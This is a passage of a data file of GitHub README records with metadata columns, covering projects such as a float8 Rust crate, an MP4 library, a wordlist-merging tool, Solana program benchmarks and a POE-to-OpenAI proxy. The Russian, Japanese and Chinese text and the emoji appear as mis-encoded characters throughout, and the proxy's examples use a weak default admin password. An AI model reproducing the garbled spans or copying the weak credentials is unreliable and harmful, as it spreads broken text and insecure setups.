–ù–µ —Å—Ç–µ—Å–Ω—è–π—Ç–µ—Å—å –æ—Ç–∫—Ä—ã–≤–∞—Ç—å –≤–æ–ø—Ä–æ—Å, –µ—Å–ª–∏ —É –≤–∞—Å –µ—Å—Ç—å –ø—Ä–æ–±–ª–µ–º—ã —Å –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º –∏–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ, —á—Ç–æ–±—ã —Ñ—É–Ω–∫—Ü–∏–∏ –±—ã–ª–∏ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã. –Ø –Ω–µ –≥–æ–≤–æ—Ä—é –ø–æ-—Ä—É—Å—Å–∫–∏, –Ω–æ –º–æ–≥—É –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —É—Å–ª—É–≥–∞–º–∏ –ø–µ—Ä–µ–≤–æ–¥—á–∏–∫–∞.

## Disclaimer
- I will not be responsible for how you use Yandex Music Downloader.    
- Yandex brand and name is the registered trademark of its respective owner.    
- Yandex Music Downloader has no partnership, sponsorship or endorsement with Yandex.
",5,0,2,MIT,,0.0
EricLBuehler/float8,master,"# `float8`: 8-bit floating point types for Rust

This crate provides 2 types:
- `F8E4M3`: Sign + 4-bit exponent + 3-bit mantissa. More precise but less dynamic range.
- `F8E5M2`: Sign + 5-bit exponent + 2-bit mantissa. Less precise but more dynamic range (same exponent as `f16`).

Generally, this crate is modelled after the `half` crate, so it can be
used alongside and with minimal code changes.

- This crate provides `no_std` support
- Requires Rust 1.70 or greater

## Optional features
- `std` - Enable features that depend on the Rust standard library.
- `serde` - Add support for the `serde` crate with `Serialize` and `Deserialize` traits.
- `num-traits` - Implement traits from `num-traits` such as `ToPrimitive`, `FromPrimitive`, `AsPrimitive`, `Num`, `Float`, `FloatCore`, and `Bounded`.
- `bytemuck` - Implement traits from `bytemuck` including `Zeroable` and `Pod`
- `zerocopy` - Implement traits from `zerocopy` including `AsBytes` and `FromBytes`
- `rand_distr` - Implement traits from `rand_distr` including `Distribution` and others
- `rkyv` - Enable zero-copy deserialization with `rkyv`.

## Resources
- Good introduction: https://en.wikipedia.org/wiki/Minifloat
- Paper: https://arxiv.org/pdf/2209.05433
",1,0,1,MIT,ci.yml,1.0
ahmedhussein107/Pupils-Plan-W25,main,"# üìö Pupils Plan W25

Welcome to the **Pupils-Plan-W25** repository! This plan is designed for beginners who are just starting their journey into competitive programming. Over the course of several weeks, you will be introduced to essential programming concepts, data structures, algorithms, and problem-solving techniques.

## üåê Codeforces Group

Join our problem-solving community on [Codeforces](https://codeforces.com/group/FcraNkfhvg) to participate in contests and practice sessions. You‚Äôll find problem sets for each week, submit your solutions, and track your progress.

## üìÖ Weekly Schedule

### Week 1: Programming Fundamentals (14/9)
- **Topics**: Introduction to Problem Solving
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/550146) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQCIhFOfvVcTXV8X826PTMOw)
- [Additional Problems](https://codeforces.com/group/FcraNkfhvg/contest/550147) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQCIhFOfvVcTXV8X826PTMOw)

### Week 2: Linear and Non-Linear DS (21/9)
- **Topics**: Linear and Noo-Linear Data Structures
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/551952) | [Solutions]()

### Week 3: Bit Manipulation / Bitmasks (28/9)
- **Topics**: Bit Manipulation
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/554120) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQB4_yfNf8xikTLdOfo-JYkK)

### Week 7: Number Theory (28/9)
- **Topics**: Primality Tests, Integer Factorizations, Euclid's Algorithm, Modular Arithmetic, Binary Exponentiation and Fermat's Little Theorem.
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/559889) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQB5VxkhmwUha5XLLR09Pgc1)

<!-- Uncomment the following sections as the weeks progress -->

<!--

### Week 4: Constructive / Greedy / Adhoc (5/10)
- **Topics**: Greedy Algorithms and Adhoc Problem Solving
- Problem Set | Solutions

### Week 5: Prefix Sum / Frequency Array / Partial Sum (12/10)
- **Topics**: Max Subarray Sum, Prefix Operations
- Problem Set | Solutions
-->

<!--
## üìÇ Structure

Each week's folder contains:
- A **Problem Set**: A collection of curated problems to help solidify the week‚Äôs concepts.
- **Solutions**: Detailed solutions for the problems covered in the sessions.
- **Extra Challenges**: An additional set of problems that may require creative approaches or tricks.
-->

## ü§ù Contributing

Feel free to submit pull requests for new solutions, optimizations, or alternate approaches. Collaboration and learning from each other are highly encouraged!

## üå± Goal

The goal of this plan is to introduce beginners to core competitive programming concepts, provide a solid foundation in problem-solving, and prepare students for more advanced topics.

Happy learning and solving! üéØ
",0,0,1,,,1.0
datastaxdevs/conference-2024-devoxx,main,"## üßëüèª‚Äçüíª üßëüèæ‚Äçüíª From naive to advanced RAG: The complete guide üë©üèø‚Äçüíª üë©‚Äçüíª

[![License Apache2](https://img.shields.io/hexpm/l/plug.svg)](http://www.apache.org/licenses/LICENSE-2.0)
![Java](https://img.shields.io/badge/Java-17%20&%20GraalVM-00CC00?style=flat)

‚ÑπÔ∏è **About this Session**

> It‚Äôs easy to get started with Retrieval Augmented Generation, but you‚Äôll quickly be disappointed with the generated answers: inaccurate or incomplete, missing context or outdated information, bad text chunking strategy, not the best documents returned by your vector database, and the list goes on.

> After meeting thousands of developers across Europe, we‚Äôve explored those pain points, and will share with you how to overcome them. As part of the team building a vector database we are aware of the different flavors of searches (semantic, meta-data, full text, multimodal) and embedding model choices. We have been implementing RAG pipelines across different projects and frameworks and are contributing to LangChain4j.

> In this deep-dive, we will examine various techniques using LangChain4j to bring your RAG to the next level: with semantic chunking, query expansion & compression, metadata filtering, document reranking, data lifecycle processes, and how to best evaluate and present the results to your users.

‚è≤Ô∏è **Duration :** `3 hours`

üéì **Level** `Intermediate`

![](img/splash.png)

## üìã Table of Demos

",0,0,1,Apache-2.0,,0.0
shiguredo/mp4-rust,develop,"# mp4-rust

[![shiguredo_mp4](https://img.shields.io/crates/v/shiguredo_mp4.svg)](https://crates.io/crates/shiguredo_mp4)
[![Documentation](https://docs.rs/shiguredo_mp4/badge.svg)](https://docs.rs/shiguredo_mp4)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)

## About Shiguredo's open source software

We will not respond to PRs or issues that have not been discussed on Discord. Also, Discord is only available in Japanese.

Please read <https://github.com/shiguredo/oss> before use.

## ÊôÇÈõ®Â†Ç„ÅÆ„Ç™„Éº„Éó„É≥„ÇΩ„Éº„Çπ„ÇΩ„Éï„Éà„Ç¶„Çß„Ç¢„Å´„Å§„ÅÑ„Å¶

Âà©Áî®Ââç„Å´ <https://github.com/shiguredo/oss> „Çí„ÅäË™≠„Åø„Åè„Å†„Åï„ÅÑ„ÄÇ

## Ê¶ÇË¶Å

Rust „ÅßÂÆüË£Ö„Åï„Çå„Åü MP4 „Éï„Ç°„Ç§„É´„ÇíË™≠„ÅøÊõ∏„Åç„Åô„Çã„Åü„ÇÅ„ÅÆ„É©„Ç§„Éñ„É©„É™„Åß„Åô„ÄÇ

‰æùÂ≠ò„É©„Ç§„Éñ„É©„É™ 0 „ÅßÂÆüÁèæ„Åó„Å¶„ÅÑ„Åæ„Åô„ÄÇ

## WebAssembly „Çµ„É≥„Éó„É´„Éö„Éº„Ç∏

WebAssembly „Çí‰Ωø„Å£„Åü„Çµ„É≥„Éó„É´„Çí GitHub Pages „Å´Áî®ÊÑè„Åó„Å¶„ÅÑ„Åæ„Åô„ÄÇ

- [MP4 Dump](https://shiguredo.github.io/mp4-rust/examples/dump/)
- [MP4 Transcode](https://shiguredo.github.io/mp4-rust/examples/transcode/)

## „É©„Ç§„Çª„É≥„Çπ

Apache License 2.0

```text
Copyright 2024-2024, Takeru Ohta (Original Author)
Copyright 2024-2024, Shiguredo Inc.

Licensed under the Apache License, Version 2.0 (the ""License"");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
",3,0,2,Apache-2.0,"ci.yml,deploy.yml",2.0
yobson1/webfishing-midi,main,"# webfishing-midi
cross-platform midi player for the webfishing guitar!\
**Warning** ‚ö†Ô∏è: the code may or may not be slop, I am not experienced with midi format

## Installation & Usage
Linux users may need additional runtime dependencies see [here](https://github.com/enigo-rs/enigo?tab=readme-ov-file#runtime-dependencies) and [here](https://github.com/nashaofu/xcap/?tab=readme-ov-file#linux-system-requirements)\
Windows users may need to install Microsoft [Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe)
- Download the executable for your platform from [here](https://github.com/yobson1/webfishing-midi/releases)
- Place your midi files in the `./midi` directory next to the executable
- Run webfishing-midi
- Select a song by typing a name to search and/or using the arrow keys & enter to make a selection
- Tab over to the game and press backspace to start playing
- Press right shift to pause/resume playing
- Press escape to stop playing

### Interface
The program uses a simple terminal interface powered by [dialoguer](https://github.com/console-rs/dialoguer) you can select a midi by typing a name to search and using the arrow keys & enter to make a selection.

#### Track selection
When selecting a track you can use the arrow keys to navigate and space to select. Enter to confirm your selection.\
If a track has all of it's fields as ""Unknown"" it is likely a meta track that has no notes and just meta messages for things like tempo changes.

#### Demo
https://github.com/user-attachments/assets/c7b81e3e-f701-4470-bc7c-66a9a4e508da

## Supported platforms
As of now this has only been tested on Linux and Windows but I have taken care to use cross-platform libraries. If you encounter a problem please [open an issue](https://github.com/yobson1/webfishing-midi/issues) and I will try to resolve it

## Building
### Installing Rust
To build from source you will need to install Rust. Some Linux distros may provide a rust package directly but rustup is recommended, distros may also have a package for rustup.
[General instructions for installing rust can be found here](https://www.rust-lang.org/tools/install)

- Install rustup using your Linux distribution's package manager or using [the install script](https://rustup.rs/). On Windows download and run [rustup-init.exe](https://rustup.rs/)
- Install the stable toolchain & set it as default with `rustup default stable`
- You can now build the project using `cargo build`

#### Example installation for Arch
```
$ sudo pacman -S rustup
$ rustup default stable
```

### Example
```
$ git clone https://github.com/yobson1/webfishing-midi.git
$ cd webfishing-midi
$ cargo build --release
```

## Acknowledgements
- Got the note shifting idea/logic from [KevAquila](https://github.com/KevAquila/WEBFISHING-Guitar-Player) his code was used as reference
- Feature contributions from [Peacockli](https://github.com/Peacockli/webfishing-midi)
",7,1,1,MIT,release.yml,0.0
Hacker-Hermanos/rustmerger,main,"# File Merger Tool

## Overview

A robust command-line tool built in Rust that makes merging and deduplicating text files a breeze. Whether you're dealing with small files or massive datasets, this tool handles the heavy lifting with parallel processing and smart error handling.

## Key Features

### Core Functionality

- **Smart File Merging**: Feed it a list of file paths via `-i/--input-files`, and it'll combine them into a single output file (`-o/--output-files`).
- **No More Duplicates**: Uses a `HashSet` under the hood to ensure each line appears exactly once in your final output.
- **Memory-Friendly**: Processes files in 10MB chunks by default, so your RAM stays happy.
- **Optimized I/O**: Uses generous buffer sizes (32MB read, 16MB write) to keep things moving quickly.

### Performance Features

- **Parallel Processing**: Spreads the work across 10 threads by default (but you can adjust this).
- **Resource-Conscious**: Chunks files to keep memory usage in check, even with large files.
- **Know What's Happening**: Shows you exactly where you are with progress bars for:
  - Overall progress
  - Current file
  - Deduplication status
- **Your Tool, Your Rules**: Tweak buffer sizes and other settings to match your needs.

### Error Handling & Reliability

- **Keeps Going**: Logs errors without stopping, because one bad file shouldn't ruin everything.
- **UTF-8 Problems? No Problem**: Skips problematic lines and keeps moving.
- **Checks First**: Makes sure all your input files exist and are readable before starting.
- **Safe Writes**: Uses atomic writing to protect your output file from corruption.

### Resume Capability

- **Never Lose Progress**: Creates checkpoint files as it works.
- **Ctrl+C Friendly**: Saves its state when interrupted so you can pick up where you left off.
- **Easy Resumption**: Just use `--resume <progress-file>` to continue an interrupted job.
- **Knows Its Place**: Keeps track of exactly where it stopped, down to the line.

## Author

Robert Pimentel

- GitHub: [@pr0b3r7](https://github.com/pr0b3r7)
- LinkedIn: [pimentelrobert1](https://linkedin.com/in/pimentelrobert1)
- Website: [hackerhermanos.com](https://www.hackerhermanos.com)

## Dependencies

This project relies on several high-quality Rust crates to provide its functionality:

### Core Dependencies

- **tokio** (1.36) - Asynchronous runtime powering parallel processing
- **clap** (4.4) - Command-line argument parsing
- **serde** (1.0) - Serialization framework for configuration
- **anyhow** (1.0.91) - Error handling with context

### File Processing

- **async-compression** (0.4.17) - Handles various compression formats (bzip2, gzip, xz)
- **zip** (2.2.0) - ZIP archive support
- **unrar** (0.5.6) - RAR archive support
- **sevenz-rust** (0.6.1) - 7z archive support
- **tar** (0.4.42) - TAR archive support

### User Interface

- **indicatif** (0.17) - Progress bars and spinners
- **dialoguer** (0.11.0) - Interactive command prompts
- **crossterm** (0.28.1) - Terminal manipulation
- **terminal_size** (0.4.0) - Terminal dimensions detection

### Utilities

- **chrono** (0.4.38) - Date and time handling
- **uuid** (1.11.0) - Unique identifier generation
- **sha2** (0.10.8) - Cryptographic hashing
- **encoding_rs** (0.8.35) - Character encoding support
- **sys-info** (0.9.1) - System information gathering

### Networking

- **reqwest** (0.12.9) - HTTP client with streaming support
- **url** (2.5.2) - URL parsing and manipulation

### Logging and Error Handling

- **env_logger** (0.11.5) - Environment-based logging
- **log** (0.4.22) - Logging framework
- **thiserror** (1.0.65) - Custom error types

### Signal Handling

- **ctrlc** (3.4.5) - Ctrl+C signal handling
- **signal-hook** (0.3.17) - OS signal handling

## Installation

### You'll Need

- Rust toolchain (1.70+)
- Cargo package manager

### Getting Started

1. Grab the code:
   ```sh
   git clone https://github.com/yourusername/file-merger-tool.git
   cd file-merger-tool
   ```

2. Build it:
   ```sh
   cargo build --release
   ```

3. Want it system-wide? (Optional):
   ```sh
   sudo cp target/release/file-merger-tool /usr/local/bin/
   ```

## Usage

### Quick Start

```sh
file-merger-tool merge -w input_list.txt -o merged_output.txt
```

### Command Reference

```
Usage: rustmerger [OPTIONS] <COMMAND>

Commands:
  merge            Merge wordlists and rules
  generate-config  Generate configuration file
  guided-setup     Run guided setup
  resume           Resume interrupted operation
  help             Print this message or the help of the given subcommand(s)

Options:
  -v, --verbose...             Set verbosity level (-v: debug, -vv: trace)
      --log-level <LOG_LEVEL>  [default: info]
  -h, --help                   Print help
  -V, --version                Print version
```

#### Merge Command

```
Usage: rustmerger merge [OPTIONS]

Options:
  -v, --verbose...              Set verbosity level (-v: debug, -vv: trace)
  -w, --wordlists-file <FILE>   Text file containing one wordlist path per line
  -r, --rules-file <FILE>       Text file containing one rule path per line
      --output-wordlist <FILE>  Destination path for merged and deduplicated wordlist
      --output-rules <FILE>     Destination path for merged and deduplicated rules
  -c, --config <FILE>           JSON configuration file with default settings
      --progress-file <FILE>    Save progress state for resume capability
  -d, --debug                   Enable detailed progress output
  -h, --help                    Print help
```

#### Generate Config Command

```
Usage: rustmerger generate-config [OPTIONS] <FILE>

Arguments:
  <FILE>  Destination path for configuration file

Options:
  -t, --template    Generate default configuration template
  -v, --verbose...  Set verbosity level (-v: debug, -vv: trace)
  -h, --help        Print help
```

#### Guided Setup Command

```
Usage: rustmerger guided-setup [OPTIONS] <FILE>

Arguments:
  <FILE>  Destination path for interactive configuration

Options:
  -v, --verbose...  Set verbosity level (-v: debug, -vv: trace)
  -h, --help        Print help
```

#### Sample Configuration File

```json
{
  ""input_files"": ""/tmp/wordlists_to_merge_dev.txt"",
  ""output_files"": ""/tmp/merged_wordlist.txt"",
  ""threads"": 90,
  ""verbose"": true,
  ""debug"": true
}
```

### Under the Hood

#### How It Works

The heavy lifting happens in the `FileProcessor` struct (`src/processing.rs`). Here's what makes it tick:

1. **Smart File Reading**: 
   - Uses async I/O with `tokio` for non-blocking file access
   - Buffers reads to minimize system calls

2. **Reliable Error Handling**:
   - Logs issues but keeps going
   - Won't let one bad file stop the whole show

3. **Line-by-Line Processing**:
   - Handles each line individually
   - Gracefully skips UTF-8 issues

4. **Progress Tracking**:
   - Keeps tabs on processed files
   - Makes resuming interrupted jobs seamless

#### Performance Tricks

1. **Parallel Power**:
   - Spreads work across multiple threads (default: 10)
   - Built on `tokio` for efficient async processing

2. **Smart Deduplication**:
   - Uses `HashSet` for O(1) lookups
   - Keeps memory usage in check

3. **Visual Feedback**:
   - Real-time progress bars
   - Shows you exactly what's happening

4. **Interruption-Proof**:
   - Handles Ctrl+C gracefully
   - Saves progress for later
   - Managed by `AppState` in `src/app_state.rs`

5. **Flexible Configuration**:
   - JSON config support via `--config <path>`
   - Interactive setup with `--guided-setup`

This tool is built to be reliable, efficient, and adaptable to your needs. Whether you're merging a few files or processing thousands, it's got you covered.",0,0,1,GPL-3.0,,0.0
joncinque/solana-program-rosetta,main,"# solana-program-rosetta

Multiple implementations of Solana programs across languages: Rust, Zig, C, and
even assembly.

More programs will be added over time!

## Getting started

### Prerequisite for all languages

* Install Rust: https://www.rust-lang.org/tools/install

### Rust

* Install Solana tools

```console
./install-solana.sh
```

* Go to a program directory

```console
cd helloworld
```

* Build a program

```console
cargo build-sbf
```

* Test a program

```console
cargo test-sbf
```

### Zig

* Get the compiler

```console
./install-solana-zig.sh
```

* Go to the Zig implementation of a program

```console
cd helloworld/zig
```

* Build the program

```console
../../solana-zig/zig build
```

* Test it

```console
cd ..
SBF_OUT_DIR=""./zig/zig-out/lib"" cargo test
```

* OR use the helper from the root of this repo to build and test

```console
./test-zig.sh helloworld
```

### C

* Install Solana C compiler

```console
./install-solana-c.sh
```

* Install Solana tools

```console
./install-solana.sh
```

* Go to a program directory

```console
cd helloworld/c
```

* Build a program

```console
make
```

* Test it

```console
cd ..
SBF_OUT_DIR=""./c/out"" cargo test
```

* OR use the helper from the root of this repo to build and test

```console
./test-c.sh helloworld
```

### Assembly

* Install Solana LLVM tools

```console
./install-solana-llvm.sh
```

* Go to a program directory

```console
cd helloworld/asm
```

* Build a program

```console
make
```

* Test it

```console
cd ..
SBF_OUT_DIR=""./asm/out"" cargo test
```

* OR use the helper from the root of this repo to build and test

```console
./test-asm.sh helloworld
```

## Current Programs

### Helloworld

Logs a static string using the `sol_log_` syscall.

| Language | CU Usage |
| --- | --- |
| Rust | 105 |
| Zig | 105 |
| C | 105 |
| Assembly | 104 |

Since this is just doing a syscall, all the languages behave the same. The only
difference is that the Assembly version *doesn't* set the return code to 0, and
lets the VM assume it worked.

### Transfer-Lamports

Moves lamports from a source account to a destination, with the amount given by
a little-endian u64 in instruction data.

| Language | CU Usage |
| --- | --- |
| Rust | 459 |
| Zig | 38 |
| C | 104 |
| Assembly | 30 |
| Rust (pinocchio) | 32 |

This one starts to get interesting since it requires parsing the instruction
input. Since the assembly version knows exactly where to find everything, it can
be hyper-optimized. The pinocchio version performs very closely to the assembly
implementation!

### CPI

Allocates a PDA given by the seed ""You pass butter"" and a bump seed in the
instruction data. This requires a call to `create_program_address` to check the
address and `invoke_signed` to CPI to the system program.

| Language | CU Usage | CU Usage (minus syscalls) |
| --- | --- | --- |
| Rust | 3698 | 1198 |
| Zig | 2825 | 325 |
| C | 3122 | 622 |
| Rust (pinocchio) | 2816 | 316 |

Note: `create_program_address` consumes 1500 CUs, and `invoke` consumes 1000, so
we can subtract 2500 CUs from each program to see the actual cost of the program
logic.

### Pubkey

A program to compare two `Pubkey` instances. This operation is very common in
on-chain programs, but it can be expensive.

| Language | CU Usage |
| --- | --- |
| Rust | 14 |
| Zig | 15 |

### Token

A reduced instruction set from SPL-Token. Includes an entrypoint, instruction
deserialization, and account serde. The Rust version is the full SPL Token
program.

  * Initialize Mint

| Language | CU Usage |
| --- | --- |
| Rust | 1115 |
| Zig | 158 |

  * Initialize Account

| Language | CU Usage |
| --- | --- |
| Rust | 2071 |
| Zig | 176 |

  * Mint To

| Language | CU Usage |
| --- | --- |
| Rust | 2189 |
| Zig | 179 |

  * Transfer

| Language | CU Usage |
| --- | --- |
| Rust | 2208 |
| Zig | 148 |

  * Burn

| Language | CU Usage |
| --- | --- |
| Rust | 2045 |
| Zig | 145 |

  * Close Account

| Language | CU Usage |
| --- | --- |
| Rust | 1483 |
| Zig | 130 |
",0,0,1,Apache-2.0,main.yml,20.0
jeromeleong/poe2openai,master,"# üîÑ POE to OpenAI API

[![Rust](https://img.shields.io/badge/rust-1.75%2B-orange.svg)](https://www.rust-lang.org)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Docker Version](https://img.shields.io/docker/v/jeromeleong/poe2openai?sort=semver)](https://hub.docker.com/r/jeromeleong/poe2openai)
[![Docker Size](https://img.shields.io/docker/image-size/jeromeleong/poe2openai/latest
)](https://hub.docker.com/r/jeromeleong/poe2openai)
[![Docker Pulls](https://img.shields.io/docker/pulls/jeromeleong/poe2openai)](https://hub.docker.com/r/jeromeleong/poe2openai)

Poe2OpenAI ÊòØ‰∏ÄÂÄãÂ∞á POE API ËΩâÊèõÁÇ∫ OpenAI API Ê†ºÂºèÁöÑ‰ª£ÁêÜÊúçÂãô„ÄÇËÆì Poe Ë®ÇÈñ±ËÄÖËÉΩÂ§†ÈÄöÈÅé OpenAI API Ê†ºÂºè‰ΩøÁî®Poe ÁöÑÂêÑÁ®ÆAIÊ®°Âûã

## üìë ÁõÆÈåÑ
- [‰∏ªË¶ÅÁâπÈªû](#-‰∏ªË¶ÅÁâπÈªû)
- [ÂÆâË£ùÊåáÂçó](#-ÂÆâË£ùÊåáÂçó)
- [Âø´ÈÄüÈñãÂßã](#-Âø´ÈÄüÈñãÂßã)
- [API ÊñáÊ™î](#-api-ÊñáÊ™î)
- [ÈÖçÁΩÆË™™Êòé](#Ô∏è-ÈÖçÁΩÆË™™Êòé)
- [Â∏∏Ë¶ãÂïèÈ°å](#-Â∏∏Ë¶ãÂïèÈ°å)
- [Ë≤¢ÁçªÊåáÂçó](#-Ë≤¢ÁçªÊåáÂçó)
- [ÊéàÊ¨äÂçîË≠∞](#-ÊéàÊ¨äÂçîË≠∞)

## ‚ú® ‰∏ªË¶ÅÁâπÈªû
- üîÑ ÊîØÊè¥ OpenAI API Ê†ºÂºèÔºà/models Âíå /chat/completionsÔºâ
- üí¨ ÊîØÊè¥‰∏≤ÊµÅÂíåÈùû‰∏≤ÊµÅÊ®°Âºè
- üìä Web ÁÆ°ÁêÜ‰ªãÈù¢Áî®ÊñºÈÖçÁΩÆÊ®°ÂûãÔºàÊ®°ÂûãÊò†Â∞Ñ Âíå Á∑®ËºØ/models È°ØÁ§∫ÁöÑÊ®°ÂûãÔºâ
- üöÄ Rust ÂØ¶Áèæ
- üåê Â∞ç POE API ÁöÑ Event ÈÄ≤Ë°åÂÆåÊï¥ËôïÁêÜ
- üê≥ Docker ÊîØÊè¥

## üîß ÂÆâË£ùÊåáÂçó

### ‰ΩøÁî® DockerÔºàÊé®Ëñ¶Ôºâ

```bash
# ÊãâÂèñÊò†ÂÉè
docker pull jeromeleong/poe2openai:latest

# ÈÅãË°åÂÆπÂô®
docker run --name poe2openai -d \
  -p 8080:8080 \
  -e ADMIN_USERNAME=admin\
  -e ADMIN_PASSWORD=123456 \
  jeromeleong/poe2openai:latest
```

### ‰ΩøÁî® Docker Compose

```yaml
version: '3.8'
services:
  poe2openai:
    image: jeromeleong/poe2openai:latest
    ports:
      - ""8080:8080""
    environment:
      - PORT=8080
      - LOG_LEVEL=info
      - ADMIN_USERNAME=admin
      - ADMIN_PASSWORD=123456
      - MAX_REQUEST_SIZE=1073741824
```

### ÂæûÊ∫êÁ¢ºÁ∑®Ë≠Ø

```bash
# ÂÖãÈöÜÂ∞àÊ°à
git clone https://github.com/jeromeleong/poe2openai
cd poe2openai

# Á∑®Ë≠Ø
cargo build --release

# ÈÅãË°å
./target/release/poe2openai
```

## üöÄ Âø´ÈÄüÈñãÂßã

1. ‰ΩøÁî® Docker ÂïüÂãïÊúçÂãôÔºö
```bash
docker run -d -p 8080:8080 jeromeleong/poe2openai:latest
```

2. ÊúçÂãôÂô®ÈªòË™çÂú® `http://localhost:8080` ÂïüÂãï

3. ‰ΩøÁî®ÊñπÂºèÁ§∫‰æãÔºö
```bash
curl http://localhost:8080/v1/chat/completions \
  -H ""Content-Type: application/json"" \
  -H ""Authorization: Bearer your-poe-token"" \
  -d '{
    ""model"": ""gpt-4o-mini"",
    ""messages"": [{""role"": ""user"", ""content"": ""‰Ω†Â•Ω""}],
    ""stream"": true
  }'
```

4. ÂèØ‰ª•Âú®`http://localhost:8080\admin`ÁÆ°ÁêÜÊ®°Âûã

## üìñ API ÊñáÊ™î

### ÊîØÊè¥ÁöÑ Openai APIÁ´ØÈªû

- `GET /v1/models` - Áç≤ÂèñÂèØÁî®Ê®°ÂûãÂàóË°®
- `POST /v1/chat/completions` - Ëàá POE Ê®°ÂûãËÅäÂ§©
- `GET /models` - Áç≤ÂèñÂèØÁî®Ê®°ÂûãÂàóË°®ÔºàÁõ∏ÂÆπÁ´ØÈªûÔºâ
- `POST /chat/completions` - Ëàá POE Ê®°ÂûãËÅäÂ§©ÔºàÁõ∏ÂÆπÁ´ØÈªûÔºâ

### Ë´ãÊ±ÇÊ†ºÂºè
```json
{
  ""model"": ""string"",
  ""messages"": [
    {
      ""role"": ""user"",
      ""content"": ""string""
    }
  ],
  ""temperature"": 0.7,
  ""stream"": false
}
```

### ÈüøÊáâÊ†ºÂºè

```json
{
  ""id"": ""chatcmpl-xxx"",
  ""object"": ""chat.completion"",
  ""created"": 1677858242,
  ""model"": ""gpt-4o-mini"",
  ""choices"": [
    {
      ""index"": 0,
      ""message"": {
        ""role"": ""assistant"",
        ""content"": ""ÂõûÊáâÂÖßÂÆπ""
      },
      ""finish_reason"": ""stop""
    }
  ]
}
```

## ‚öôÔ∏è ÈÖçÁΩÆË™™Êòé

ÊúçÂãôÂô®ÈÖçÁΩÆÈÄöÈÅéÁí∞Â¢ÉËÆäÈáèÈÄ≤Ë°åÔºö

- `PORT` - ÊúçÂãôÂô®Á´ØÂè£ÔºàÈªòË™çÔºö8080Ôºâ
- `HOST` - ÊúçÂãôÂô®‰∏ªÊ©üÔºàÈªòË™çÔºö0.0.0.0Ôºâ
- `ADMIN_USERNAME` - ÁÆ°ÁêÜ‰ªãÈù¢Áî®Êà∂Âêç	ÈªòË™çÔºöadminÔºâ
- `ADMIN_PASSWORD` - ÁÆ°ÁêÜ‰ªãÈù¢ÂØÜÁ¢º	ÈªòË™çÔºö123456Ôºâ
- `MAX_REQUEST_SIZE` - ÊúÄÂ§ßË´ãÊ±ÇÂ§ßÂ∞èÔºàÈªòË™çÔºö1073741824Ôºâ
- `LOG_LEVEL` - Êó•Ë™åÁ¥öÂà•ÔºàÈªòË™çÔºöinfoÔºâ

## ‚ùì Â∏∏Ë¶ãÂïèÈ°å

### Q: Poe API TokenÂ¶Ç‰ΩïÁç≤ÂèñÔºü
A: È¶ñÂÖàË¶ÅË®ÇÈñ±PoeÔºåÊâçËÉΩÂæû[Poe API Key](https://poe.com/api_key)Á∂≤È†Å‰∏≠ÂèñÂæó

### Q: ÁÇ∫‰ªÄÈ∫ºÊúÉÊî∂Âà∞Ë™çË≠âÈåØË™§Ôºü
A: Á¢∫‰øùÂú®Ë´ãÊ±ÇÈ†≠‰∏≠Ê≠£Á¢∫Ë®≠ÁΩÆ‰∫Ü `Authorization: Bearer your-poe-token`

### Q: ÊîØÊè¥Âì™‰∫õÊ®°ÂûãÔºü
A: ÊîØÊè¥ÊâÄÊúâ POE Âπ≥Âè∞‰∏äÂèØÁî®ÁöÑÊ®°ÂûãÔºåÂèØÈÄöÈÅé `/v1/models` Á´ØÈªûÊü•Ë©¢

### Q: Â¶Ç‰Ωï‰øÆÊîπÊúçÂãôÂô®Á´ØÂè£Ôºü
A: ÂèØ‰ª•ÈÄöÈÅéË®≠ÁΩÆÁí∞Â¢ÉËÆäÈáè `PORT` ‰æÜ‰øÆÊîπÔºå‰æãÂ¶ÇÔºö
```bash
docker run -d -e PORT=3000 -p 3000:3000 jeromeleong/poe2openai:latest
```

## ü§ù Ë≤¢ÁçªÊåáÂçó

Ê≠°ËøéÊâÄÊúâÂΩ¢ÂºèÁöÑË≤¢ÁçªÔºÅ

## üìÑ ÊéàÊ¨äÂçîË≠∞

Êú¨Â∞àÊ°à‰ΩøÁî® [MIT ÊéàÊ¨äÂçîË≠∞](LICENSE)„ÄÇ
",0,4,1,MIT,,0.0
alexpasmantier/rust-devicons,main,"![GitHub branch check runs](https://img.shields.io/github/check-runs/alexpasmantier/rust-devicons/main)
![docs.rs](https://img.shields.io/docsrs/devicons)
![Crates.io Total Downloads](https://img.shields.io/crates/d/devicons)
![GitHub License](https://img.shields.io/github/license/alexpasmantier/rust-devicons)
![Crates.io Version](https://img.shields.io/crates/v/devicons)
![Crates.io Size](https://img.shields.io/crates/size/devicons)




# ü¶Ä `rust-devicons`

A Rust library inspired by [vim-devicons](https://github.com/ryanoasis/vim-devicons), that provides filetype glyphs (icons) for a wide range of common file formats.

<img width=""2197"" alt=""rust-devicons"" src=""https://github.com/user-attachments/assets/f2beb589-f97d-4afd-9262-483f59bc2ad8"">

## Features

- ü¶û **Icon Retrieval**: Get file or directory icons based on file name/extension.
- ü¶û **Icon Color**: Retrieve the color associated with the icon depending on the specified theme.
- ü¶û **Filetype Support**: Supports a wide range of filetypes and filename conventions (dockerfile, makefile, etc.).
- ü¶û **Customizable Themes**: Supports both light and dark themes.

<img width=""1443"" alt=""Screenshot 2024-09-21 at 16 54 16"" src=""https://github.com/user-attachments/assets/4e60cb61-2e02-4f21-965c-2b934a15575c"">


## Installation

